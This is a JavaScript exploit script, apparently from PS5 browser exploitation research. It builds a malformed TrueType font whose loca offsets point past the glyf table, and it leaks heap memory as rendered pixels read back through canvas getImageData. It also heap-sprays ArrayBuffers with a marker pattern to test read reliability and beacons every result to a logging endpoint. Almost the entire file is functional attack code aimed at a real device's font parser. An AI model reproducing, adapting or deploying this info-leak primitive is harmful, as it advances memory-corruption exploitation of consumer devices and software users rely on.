// p260-loca-oob-leak.js — Font loca table OOB read for heap info leak
//
// V190A-P2-T3 confirmed: font with OOB loca offsets loaded + rendered on PS5 14.20
// V180A-T7 confirmed: directory offset past EOF also accepted (1048x48)
//
// Strategy:
//   1. Build minimal TrueType font with SHORT loca format (indexToLocFormat=0)
//   2. glyf table placed LAST in file so OOB offsets read adjacent heap
//   3. Glyph 0 = .notdef (empty), glyph 1 = valid box (A), glyphs 2-5 = OOB (B-E)
//   4. loca entries for glyphs 2-5 point +64, +128, +256, +512 bytes past glyf end
//   5. Render via canvas + getImageData to extract leaked heap data as pixels
//   6. Stability test: two fonts, same OOB offsets, compare pixel output
//   7. Spray test: plant known ArrayBuffer pattern, check if OOB reads hit it
//
// Tables: head, hhea, hmtx, maxp, cmap, loca, glyf, post, name, OS/2
// Proper table checksums + head checkSumAdjustment
//
// Beacon prefix: V260-

(function() {
  'use strict';

  // ---- Beaconing ----
  function B(tag, body) {
    try {
      var url = '/beacon/V260-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
  function hex2(v) { return ('0' + (v & 0xFF).toString(16)).slice(-2); }

  B('BOOT');

  if (typeof FontFace === 'undefined') { B('NO-FONTFACE'); return; }

  // ---- Binary helpers ----
  function p16(a, v) { a.push((v >> 8) & 0xFF, v & 0xFF); }
  function p32(a, v) {
    a.push((v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF);
  }
  function pad4(a) { while (a.length % 4) a.push(0); }
  function tagU32(s) {
    return ((s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) |
            (s.charCodeAt(2) << 8) | s.charCodeAt(3)) >>> 0;
  }

  // Table checksum: sum of 4-byte big-endian uint32, zero-padded to 4-byte boundary
  function tblChecksum(bytes) {
    var s = 0, len = bytes.length;
    for (var i = 0; i < len; i += 4) {
      var w = ((bytes[i] || 0) << 24) |
              (((i + 1 < len ? bytes[i + 1] : 0)) << 16) |
              (((i + 2 < len ? bytes[i + 2] : 0)) << 8) |
              ((i + 3 < len ? bytes[i + 3] : 0));
      s = (s + (w >>> 0)) >>> 0;
    }
    return s;
  }

  // ---- Canvas constants ----
  var CW = 200, CH = 100, FONT_PX = 64;

  // ---- Build TrueType font with OOB loca entries ----
  // familyName: unique per font instance to avoid cache collisions
  // Returns { buf: ArrayBuffer, totalSz, glyfOff, glyfSz, oobDists }
  function buildFont(familyName) {
    var OOB = [64, 128, 256, 512]; // distances past glyf end
    var NOOB = OOB.length;
    var NGLYPHS = 2 + NOOB; // 6: notdef(0), ref(1), OOB(2-5)
    var NTABLES = 10;

    // ======== head (54 bytes) — indexToLocFormat=0 (SHORT) ========
    var head = [];
    p32(head, 0x00010000); // version 1.0
    p32(head, 0x00005000); // fontRevision
    p32(head, 0x00000000); // checkSumAdjustment (patched after assembly)
    p32(head, 0x5F0F3CF5); // magicNumber
    p16(head, 0x000B);     // flags
    p16(head, 1000);       // unitsPerEm
    p32(head, 0); p32(head, 0); // created timestamp
    p32(head, 0); p32(head, 0); // modified timestamp
    p16(head, 0);    p16(head, 0);    // xMin, yMin
    p16(head, 500);  p16(head, 700);  // xMax, yMax
    p16(head, 0);    // macStyle
    p16(head, 8);    // lowestRecPPEM
    p16(head, 2);    // fontDirectionHint
    p16(head, 0);    // indexToLocFormat = 0 (SHORT FORMAT)
    p16(head, 0);    // glyphDataFormat

    // ======== hhea (36 bytes) ========
    var hhea = [];
    p32(hhea, 0x00010000); // version
    p16(hhea, 800);        // ascender
    p16(hhea, 0xFE70);     // descender (-400 as int16)
    p16(hhea, 0);          // lineGap
    p16(hhea, 600);        // advanceWidthMax
    p16(hhea, 0);          // minLeftSideBearing
    p16(hhea, 0);          // minRightSideBearing
    p16(hhea, 600);        // xMaxExtent
    p16(hhea, 1);          // caretSlopeRise
    p16(hhea, 0);          // caretSlopeRun
    p16(hhea, 0);          // caretOffset
    p16(hhea, 0); p16(hhea, 0); p16(hhea, 0); p16(hhea, 0); // reserved
    p16(hhea, 0);          // metricDataFormat
    p16(hhea, NGLYPHS);    // numberOfHMetrics

    // ======== hmtx (4 bytes per glyph) ========
    var hmtx = [];
    p16(hmtx, 500); p16(hmtx, 0);  // glyph 0 (.notdef)
    p16(hmtx, 600); p16(hmtx, 50); // glyph 1 (reference, maps to 'A')
    for (var i = 0; i < NOOB; i++) {
      p16(hmtx, 600); p16(hmtx, 0); // OOB glyphs (B-E)
    }

    // ======== maxp (32 bytes) ========
    var maxp = [];
    p32(maxp, 0x00010000); // version 1.0
    p16(maxp, NGLYPHS);    // numGlyphs
    p16(maxp, 4);  // maxPoints
    p16(maxp, 1);  // maxContours
    p16(maxp, 0);  // maxCompositePoints
    p16(maxp, 0);  // maxCompositeContours
    p16(maxp, 1);  // maxZones
    p16(maxp, 0);  // maxTwilightPoints
    p16(maxp, 0);  // maxStorage
    p16(maxp, 0);  // maxFunctionDefs
    p16(maxp, 0);  // maxInstructionDefs
    p16(maxp, 0);  // maxStackElements
    p16(maxp, 0);  // maxSizeOfInstructions
    p16(maxp, 0);  // maxComponentElements
    p16(maxp, 0);  // maxComponentDepth

    // ======== cmap — format 4 ========
    // Maps: A(0x41)->glyph1, B(0x42)->glyph2, C(0x43)->glyph3,
    //       D(0x44)->glyph4, E(0x45)->glyph5
    var cmap = [];
    p16(cmap, 0);   // version
    p16(cmap, 1);   // numTables
    p16(cmap, 3);   // platformID (Windows)
    p16(cmap, 1);   // encodingID (Unicode BMP)
    p32(cmap, 12);  // offset to format 4 subtable
    // format 4 subtable (2 segments: data + sentinel)
    var f4s = cmap.length;
    p16(cmap, 4);      // format
    p16(cmap, 0);      // length (patched below)
    p16(cmap, 0);      // language
    p16(cmap, 4);      // segCountX2 (2 segments)
    p16(cmap, 4);      // searchRange = 2^floor(log2(2)) * 2
    p16(cmap, 1);      // entrySelector = floor(log2(2))
    p16(cmap, 0);      // rangeShift = segCountX2 - searchRange
    // endCode[]
    p16(cmap, 0x0045); // segment 0: end = 'E'
    p16(cmap, 0xFFFF); // sentinel
    p16(cmap, 0);      // reservedPad
    // startCode[]
    p16(cmap, 0x0041); // segment 0: start = 'A'
    p16(cmap, 0xFFFF); // sentinel
    // idDelta[] — delta = 1 - 0x41 = -0x40 = -64
    p16(cmap, 0xFFC0); // -64: 0x41+(-64)=1, 0x42+(-64)=2, etc.
    p16(cmap, 1);      // sentinel
    // idRangeOffset[]
    p16(cmap, 0);
    p16(cmap, 0);
    // Patch subtable length
    var f4len = cmap.length - f4s;
    cmap[f4s + 2] = (f4len >> 8) & 0xFF;
    cmap[f4s + 3] = f4len & 0xFF;

    // ======== glyf — valid rectangle glyph at offset 0 ========
    // Glyph 0 (.notdef) is empty (loca[0] == loca[1] => zero-length)
    // Glyph 1 data starts at offset 0: rectangle (0,0)-(500,700)
    var glyf = [];
    p16(glyf, 1);      // numberOfContours = 1
    p16(glyf, 0);      // xMin = 0
    p16(glyf, 0);      // yMin = 0
    p16(glyf, 500);    // xMax = 500
    p16(glyf, 700);    // yMax = 700
    p16(glyf, 3);      // endPtsOfContours[0] = 3 (4 points)
    p16(glyf, 0);      // instructionLength = 0
    // Flags: on-curve, word-size x and y deltas (flag=0x01)
    glyf.push(0x01, 0x01, 0x01, 0x01);
    // X deltas (int16 BE): 0, +500, 0, -500
    // Points: (0,0) -> (500,0) -> (500,700) -> (0,700) — clockwise box
    p16(glyf, 0);      // pt0 dx = 0
    p16(glyf, 500);    // pt1 dx = +500
    p16(glyf, 0);      // pt2 dx = 0
    p16(glyf, 0xFE0C); // pt3 dx = -500 (0x10000-500)
    // Y deltas (int16 BE): 0, 0, +700, 0
    p16(glyf, 0);      // pt0 dy = 0
    p16(glyf, 0);      // pt1 dy = 0
    p16(glyf, 700);    // pt2 dy = +700
    p16(glyf, 0);      // pt3 dy = 0
    pad4(glyf);         // pad to 4-byte boundary
    var GLYF_SZ = glyf.length; // 36 bytes (34 data + 2 pad)

    // ======== loca — SHORT format (uint16, actual_offset = entry * 2) ========
    // numGlyphs + 1 = 7 entries
    var loca = [];
    p16(loca, 0); // [0] glyph 0 start = 0
    p16(loca, 0); // [1] glyph 0 end / glyph 1 start = 0 (glyph 0 is empty)
    // [2]-[5]: OOB glyph start offsets
    // Each OOB glyph starts at GLYF_SZ + OOB_DIST bytes into glyf table
    // Short loca stores offset/2, so entry = (GLYF_SZ + dist) / 2
    for (var i = 0; i < NOOB; i++) {
      p16(loca, ((GLYF_SZ + OOB[i]) >> 1) & 0xFFFF);
    }
    // [6] Sentinel: end of last OOB glyph (64-byte read window)
    p16(loca, ((GLYF_SZ + OOB[NOOB - 1] + 64) >> 1) & 0xFFFF);
    // 7 entries * 2 bytes = 14 bytes

    // ======== post (32 bytes, format 3.0) ========
    var post = [];
    p32(post, 0x00030000); // format 3.0 (no glyph names)
    p32(post, 0);          // italicAngle
    p16(post, 0xFF9C);     // underlinePosition (-100)
    p16(post, 50);         // underlineThickness
    p32(post, 0);          // isFixedPitch
    p32(post, 0); p32(post, 0); // minMemType42, maxMemType42
    p32(post, 0); p32(post, 0); // minMemType1, maxMemType1

    // ======== name ========
    var nchars = [];
    for (var c = 0; c < familyName.length; c++) {
      nchars.push(0, familyName.charCodeAt(c)); // UTF-16BE
    }
    var nids = [0, 1, 2, 4, 5, 6]; // copyright, family, style, full, version, PS
    var nrecs = nids.length;
    var nstorOff = 6 + nrecs * 12;
    var nameT = [];
    p16(nameT, 0);          // format
    p16(nameT, nrecs);      // count
    p16(nameT, nstorOff);   // stringOffset
    for (var n = 0; n < nrecs; n++) {
      p16(nameT, 3);        // platformID (Windows)
      p16(nameT, 1);        // encodingID (Unicode BMP)
      p16(nameT, 0x0409);   // languageID (English US)
      p16(nameT, nids[n]);  // nameID
      p16(nameT, nchars.length); // length
      p16(nameT, 0);        // offset in storage (all share same string)
    }
    for (var i = 0; i < nchars.length; i++) nameT.push(nchars[i]);

    // ======== OS/2 (86 bytes, version 1) ========
    var os2 = [];
    p16(os2, 1);    // version
    p16(os2, 500);  // xAvgCharWidth
    p16(os2, 400);  // usWeightClass
    p16(os2, 5);    // usWidthClass
    p16(os2, 0);    // fsType
    // 10 int16 fields: ySubscript{X,Y}Size, ySubscript{X,Y}Offset,
    //   ySuperscript{X,Y}Size, ySuperscript{X,Y}Offset,
    //   yStrikeoutSize, yStrikeoutPosition
    for (var i = 0; i < 10; i++) p16(os2, 0);
    p16(os2, 0);    // sFamilyClass
    // panose (10 bytes)
    for (var i = 0; i < 10; i++) os2.push(0);
    // ulUnicodeRange1-4
    p32(os2, 0x00000001); // Basic Latin
    p32(os2, 0); p32(os2, 0); p32(os2, 0);
    // achVendID
    os2.push(0x4E, 0x4F, 0x4E, 0x45); // 'NONE'
    p16(os2, 0x0040);  // fsSelection = REGULAR
    p16(os2, 0x0041);  // usFirstCharIndex = 'A'
    p16(os2, 0x0045);  // usLastCharIndex = 'E'
    p16(os2, 800);     // sTypoAscender
    p16(os2, 0xFF38);  // sTypoDescender (-200)
    p16(os2, 0);       // sTypoLineGap
    p16(os2, 1000);    // usWinAscent
    p16(os2, 200);     // usWinDescent
    // ulCodePageRange1-2
    p32(os2, 0x00000001); // Latin 1
    p32(os2, 0);

    // ======== ASSEMBLE FONT ========

    var tables = {
      'OS/2': os2, 'cmap': cmap, 'glyf': glyf, 'head': head, 'hhea': hhea,
      'hmtx': hmtx, 'loca': loca, 'maxp': maxp, 'name': nameT, 'post': post
    };

    // Sorted tags for directory (by 4-byte tag value)
    var sortedTags = ['OS/2','cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];

    // File layout order: glyf LAST so OOB reads go into heap
    var fileOrder = ['OS/2','cmap','head','hhea','hmtx','loca','maxp','name','post','glyf'];

    // Compute file offsets
    var headerSz = 12 + NTABLES * 16; // 172 bytes
    var foff = headerSz;
    var offMap = {}, szMap = {};
    for (var i = 0; i < fileOrder.length; i++) {
      var t = fileOrder[i];
      offMap[t] = foff;
      szMap[t] = tables[t].length;
      foff += szMap[t];
      foff += (4 - (foff % 4)) % 4; // align next table to 4 bytes
    }
    var totalSz = foff;

    // Create buffer
    var buf = new ArrayBuffer(totalSz);
    var u8 = new Uint8Array(buf);
    var dv = new DataView(buf);

    // sfnt header
    dv.setUint32(0, 0x00010000); // version
    dv.setUint16(4, NTABLES);
    dv.setUint16(6, 128);  // searchRange (2^3 * 16)
    dv.setUint16(8, 3);    // entrySelector
    dv.setUint16(10, NTABLES * 16 - 128); // rangeShift

    // Write table data first (so checksums can be computed)
    for (var i = 0; i < fileOrder.length; i++) {
      var t = fileOrder[i];
      var o = offMap[t];
      var b = tables[t];
      for (var j = 0; j < b.length; j++) u8[o + j] = b[j];
    }

    // Write directory entries in sorted tag order
    for (var i = 0; i < sortedTags.length; i++) {
      var t = sortedTags[i];
      var d = 12 + i * 16;
      dv.setUint32(d, tagU32(t));
      dv.setUint32(d + 4, tblChecksum(tables[t]));
      dv.setUint32(d + 8, offMap[t]);
      dv.setUint32(d + 12, szMap[t]);
    }

    // Compute head checkSumAdjustment:
    // 1. Sum all uint32 words in entire file (with checkSumAdjustment=0)
    var fileSum = 0;
    for (var i = 0; i < totalSz; i += 4) {
      fileSum = (fileSum + dv.getUint32(i)) >>> 0;
    }
    // 2. checkSumAdjustment = 0xB1B0AFBA - fileSum
    var adj = (0xB1B0AFBA - fileSum) >>> 0;
    dv.setUint32(offMap['head'] + 8, adj);

    return {
      buf: buf,
      totalSz: totalSz,
      glyfOff: offMap['glyf'],
      glyfSz: GLYF_SZ,
      oobDists: OOB
    };
  }

  // ---- Pixel analysis helpers ----

  // DJB2 hash of non-transparent pixel RGBA values
  function pixHash(data) {
    var h = 5381;
    for (var i = 0; i < data.length; i += 4) {
      if (data[i + 3] > 0) {
        h = ((h << 5) + h + data[i]) >>> 0;
        h = ((h << 5) + h + data[i + 1]) >>> 0;
        h = ((h << 5) + h + data[i + 2]) >>> 0;
        h = ((h << 5) + h + data[i + 3]) >>> 0;
      }
    }
    return h;
  }

  // Count pixels with alpha > threshold
  function pixCount(data) {
    var n = 0;
    for (var i = 3; i < data.length; i += 4) {
      if (data[i] > 10) n++;
    }
    return n;
  }

  // Sample first N non-transparent pixels: "x,y:RRGGBBAA ..."
  function sampleRGBA(data, max) {
    var out = [];
    for (var i = 0; i < data.length && out.length < max; i += 4) {
      if (data[i + 3] > 10) {
        var px = (i / 4) % CW;
        var py = Math.floor((i / 4) / CW);
        out.push(px + ',' + py + ':' +
          hex2(data[i]) + hex2(data[i + 1]) +
          hex2(data[i + 2]) + hex2(data[i + 3]));
      }
    }
    return out.join(' ');
  }

  // Render a character with the named font, return pixel data
  function renderCh(fontName, ch) {
    var c = document.createElement('canvas');
    c.width = CW; c.height = CH;
    var ctx = c.getContext('2d');
    ctx.fillStyle = '#000';
    ctx.font = FONT_PX + 'px "' + fontName + '"';
    ctx.fillText(ch, 10, 80);
    return ctx.getImageData(0, 0, CW, CH).data;
  }

  // Column alpha sums — glyph shape fingerprint
  function colSums(data) {
    var cols = [];
    for (var x = 0; x < CW; x++) {
      var sum = 0;
      for (var y = 0; y < CH; y++) {
        sum += data[(y * CW + x) * 4 + 3];
      }
      if (sum > 0) cols.push(x + ':' + sum);
    }
    return cols;
  }

  // ================================================================
  //  PHASE 1 + 2: Build font, render reference + OOB glyphs
  // ================================================================

  var fi = buildFont('V260Probe');
  B('BUILT', 'sz=' + fi.totalSz + ' glyfOff=' + fi.glyfOff +
    ' glyfSz=' + fi.glyfSz + ' oob=[' + fi.oobDists.join(',') + ']');

  // Report loca entries for debugging
  var locaDv = new DataView(fi.buf);
  var locaDebug = [];
  // loca is in the font buffer — find its offset
  // Re-read from the built buffer: head is at a known offset and indexToLocFormat=0
  // We know the loca offsets from the table we built
  B('GLYF-END-FILE', 'glyfEnd=' + (fi.glyfOff + fi.glyfSz) +
    ' fileEnd=' + fi.totalSz +
    ' pastFile=[' + fi.oobDists.map(function(d) {
      return (fi.glyfOff + fi.glyfSz + d - fi.totalSz);
    }).join(',') + ']');

  var face = new FontFace('V260Probe', fi.buf);
  face.load().then(function(loaded) {
    document.fonts.add(loaded);
    B('LOADED');

    // Measure advance widths for all mapped characters
    var c0 = document.createElement('canvas');
    c0.width = CW; c0.height = CH;
    var ctx0 = c0.getContext('2d');
    ctx0.font = FONT_PX + 'px "V260Probe"';
    var widths = [];
    for (var ch = 0x41; ch <= 0x45; ch++) {
      var w = ctx0.measureText(String.fromCharCode(ch)).width;
      widths.push(String.fromCharCode(ch) + '=' + w.toFixed(1));
    }
    B('WIDTHS', widths.join(' '));

    // Phase 1: Reference glyph 'A' (valid box)
    var refPx = renderCh('V260Probe', 'A');
    var rC = pixCount(refPx);
    var rH = pixHash(refPx);
    B('REF', 'pix=' + rC + ' hash=' + hex(rH));
    if (rC > 0) {
      B('REF-RGBA', sampleRGBA(refPx, 8));
    } else {
      B('REF-EMPTY');
    }

    // Phase 2: OOB glyphs B, C, D, E
    var oobChars = ['B', 'C', 'D', 'E'];
    var oobPixels = [];
    for (var g = 0; g < oobChars.length; g++) {
      var ch = oobChars[g];
      var px = renderCh('V260Probe', ch);
      var cnt = pixCount(px);
      var h = pixHash(px);

      // Count pixels that differ from reference
      var diff = 0;
      for (var j = 0; j < px.length; j += 4) {
        if (Math.abs(px[j + 3] - refPx[j + 3]) > 5) diff++;
      }

      B('OOB-' + ch, 'dist=' + fi.oobDists[g] +
        ' pix=' + cnt + ' hash=' + hex(h) + ' diff=' + diff);

      if (cnt > 0) {
        B('OOB-' + ch + '-RGBA', sampleRGBA(px, 8));
        // Column sums — shape fingerprint
        var cs = colSums(px);
        if (cs.length > 0) {
          B('OOB-' + ch + '-COLS', cs.slice(0, 25).join(' '));
        }
      }

      oobPixels.push(px);
    }

    try { document.fonts.delete(loaded); } catch(e) {}

    // ================================================================
    //  PHASE 3: Stability — same OOB offsets, different font name
    //  If pixels match, OOB data is deterministic (real heap data)
    // ================================================================
    setTimeout(function() { phase3(oobChars, oobPixels); }, 300);

  }).catch(function(e) {
    B('LOAD-ERR', String(e).substring(0, 80));
  });

  function phase3(oobChars, oobPx1) {
    B('P3-STAB');
    var fi2 = buildFont('V260Stab');
    B('P3-BUILT', 'sz=' + fi2.totalSz);

    var face2 = new FontFace('V260Stab', fi2.buf);
    face2.load().then(function(loaded2) {
      document.fonts.add(loaded2);
      B('P3-LOADED');

      for (var g = 0; g < oobChars.length; g++) {
        var px2 = renderCh('V260Stab', oobChars[g]);
        var h2 = pixHash(px2);
        var cnt2 = pixCount(px2);
        var match = 0, total = 0;
        for (var j = 0; j < px2.length; j += 4) {
          if (px2[j + 3] > 0 || oobPx1[g][j + 3] > 0) {
            total++;
            if (px2[j] === oobPx1[g][j] &&
                px2[j + 1] === oobPx1[g][j + 1] &&
                px2[j + 2] === oobPx1[g][j + 2] &&
                px2[j + 3] === oobPx1[g][j + 3]) {
              match++;
            }
          }
        }
        var stable = match === total && total > 0;
        B('P3-' + oobChars[g], 'pix=' + cnt2 + ' hash=' + hex(h2) +
          ' match=' + match + '/' + total + ' stable=' + stable);

        if (stable && total > 0) {
          B('P3-' + oobChars[g] + '-DETERMINISTIC');
        } else if (total === 0) {
          B('P3-' + oobChars[g] + '-NORENDER');
        }
      }

      try { document.fonts.delete(loaded2); } catch(e) {}
      setTimeout(phase4, 300);
    }).catch(function(e) {
      B('P3-ERR', String(e).substring(0, 60));
      setTimeout(phase4, 300);
    });
  }

  // ================================================================
  //  PHASE 4: Spray ArrayBuffers, then load OOB font
  //  If font buffer lands adjacent to spray, OOB reads hit known data
  // ================================================================
  function phase4() {
    B('P4-SPRAY');

    // Spray known pattern — 0xDEAD followed by 2-byte index
    var SPRAY_N = 1000, SPRAY_SZ = 512;
    var sprays = [];
    for (var s = 0; s < SPRAY_N; s++) {
      var ab = new ArrayBuffer(SPRAY_SZ);
      var v = new Uint32Array(ab);
      for (var j = 0; j < v.length; j++) {
        v[j] = (0xDEAD0000 | ((s * 128 + j) & 0xFFFF)) >>> 0;
      }
      sprays.push(ab);
    }
    B('P4-SPRAYED-' + SPRAY_N);

    var fi3 = buildFont('V260Spry');
    var face3 = new FontFace('V260Spry', fi3.buf);
    face3.load().then(function(loaded3) {
      document.fonts.add(loaded3);
      B('P4-LOADED');

      var chars = ['B', 'C', 'D', 'E'];
      for (var g = 0; g < chars.length; g++) {
        var px = renderCh('V260Spry', chars[g]);
        var cnt = pixCount(px);
        var h = pixHash(px);
        B('P4-' + chars[g], 'dist=' + fi3.oobDists[g] +
          ' pix=' + cnt + ' hash=' + hex(h));

        if (cnt > 0) {
          B('P4-' + chars[g] + '-RGBA', sampleRGBA(px, 8));

          var cs = colSums(px);
          if (cs.length > 0) {
            B('P4-' + chars[g] + '-COLS', cs.slice(0, 25).join(' '));
          }

          // Check for spray marker 0xDEAD in rendered pixels
          // The spray pattern as glyph coordinates could produce recognizable shapes
          var sprayHits = 0;
          for (var p = 0; p < px.length; p += 4) {
            // Check if any pixel pair has 0xDE,0xAD as R,G values
            if (px[p] === 0xDE && px[p + 1] === 0xAD) {
              sprayHits++;
            }
          }
          if (sprayHits > 0) {
            B('P4-' + chars[g] + '-SPRAY-HIT-' + sprayHits);
          }
        }
      }

      try { document.fonts.delete(loaded3); } catch(e) {}
      sprays = null;

      // Phase 5: One more OOB test after freeing spray (checks if data changed)
      setTimeout(phase5, 300);
    }).catch(function(e) {
      B('P4-ERR', String(e).substring(0, 60));
      sprays = null;
      B('DONE');
    });
  }

  // ================================================================
  //  PHASE 5: Post-spray — free spray buffers, load OOB font again
  //  Compare with phase 2 results to detect heap content change
  // ================================================================
  function phase5() {
    B('P5-POST');

    var fi4 = buildFont('V260Post');
    var face4 = new FontFace('V260Post', fi4.buf);
    face4.load().then(function(loaded4) {
      document.fonts.add(loaded4);
      B('P5-LOADED');

      var chars = ['B', 'C', 'D', 'E'];
      for (var g = 0; g < chars.length; g++) {
        var px = renderCh('V260Post', chars[g]);
        var cnt = pixCount(px);
        var h = pixHash(px);
        B('P5-' + chars[g], 'dist=' + fi4.oobDists[g] +
          ' pix=' + cnt + ' hash=' + hex(h));
      }

      try { document.fonts.delete(loaded4); } catch(e) {}
      B('DONE');
    }).catch(function(e) {
      B('P5-ERR', String(e).substring(0, 60));
      B('DONE');
    });
  }
})();
